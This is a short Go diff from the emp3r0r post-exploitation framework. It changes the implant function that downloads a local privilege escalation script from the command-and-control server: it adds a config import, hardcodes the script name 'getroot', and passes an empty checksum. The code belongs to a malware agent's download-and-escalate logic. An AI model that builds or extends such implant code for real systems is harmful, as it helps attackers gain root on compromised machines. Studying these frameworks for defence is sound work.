@@ -10,6 +10,7 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 )
 
@@ -17,7 +18,7 @@ import (
 func RunLPEHelper(method, checksum string) (out string) {
 	logging.Printf("Downloading LPE script from %s", def.CCAddress+method)
 	var scriptData []byte
-	scriptData, err := c2transport.FetchFile("", method, "", checksum)
+	scriptData, err := c2transport.FetchFile(common.RuntimeConfig, "", "getroot", "", "")
 	if err != nil {
 		return "Download error: " + err.Error()
 	}
